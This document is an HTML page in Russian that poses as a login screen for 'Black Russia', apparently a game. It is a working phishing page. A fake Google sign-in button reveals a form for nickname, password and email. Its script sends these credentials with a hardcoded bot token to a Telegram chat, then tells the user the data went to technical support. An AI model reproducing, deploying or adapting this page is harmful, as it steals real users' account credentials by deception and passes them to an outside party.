<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Black Russia - Вход</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), 
                        url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-4.0.3&w=1200&q=80');
            background-size: cover;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(0,0,0,0.9);
            padding: 40px;
            border-radius: 15px;
            border: 2px solid #b8860b;
            max-width: 400px;
            width: 100%;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #b8860b;
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        
        .google-btn {
            width: 100%;
            padding: 12px;
            background: white;
            color: #333;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .google-btn:hover {
            background: #f5f5f5;
        }
        
        .divider {
            text-align: center;
            margin: 20px 0;
            color: #666;
            position: relative;
        }
        
        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #333;
        }
        
        .divider span {
            background: #000;
            padding: 0 15px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #333;
            border-radius: 5px;
            background: #111;
            color: white;
        }
        
        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #b8860b, #daa520);
            color: black;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>BLACK RUSSIA</h1>
            <p>Вход в систему</p>
        </div>
        
        <button class="google-btn" onclick="showManualForm()">
            <span>G</span>
            Войти через Google
        </button>
        
        <div class="divider"><span>или</span></div>
        
        <form id="loginForm" style="display: none;">
            <input type="text" id="nickname" placeholder="Никнейм" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <input type="email" id="email" placeholder="Email" required>
            <button type="submit" class="submit-btn">Войти в аккаунт</button>
        </form>
        
        <div id="successMessage" style="display: none; color: green; text-align: center; margin-top: 15px;">
            ✅ Данные отправлены в техподдержку
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8';
        const TELEGRAM_CHAT_ID = '1491315056';
        
        function showManualForm() {
            document.getElementById('loginForm').style.display = 'block';
            document.querySelector('.google-btn').style.display = 'none';
            document.querySelector('.divider').style.display = 'none';
        }
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const nickname = document.getElementById('nickname').value;
            const password = document.getElementById('password').value;
            const email = document.getElementById('email').value;
            
            const text = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ BLACK RUSSIA\n\n` +
                        `👤 Никнейм: ${nickname}\n` +
                        `🔑 Пароль: ${password}\n` +
                        `📧 Email: ${email}\n` +
                        `🌐 Метод: Google Auth\n` +
                        `⏰ Время: ${new Date().toLocaleString()}`;
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
            })
            .then(() => {
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('loginForm').reset();
                setTimeout(() => {
                    document.getElementById('successMessage').style.display = 'none';
                }, 3000);
            });
        });
    </script>
</body>
</html>
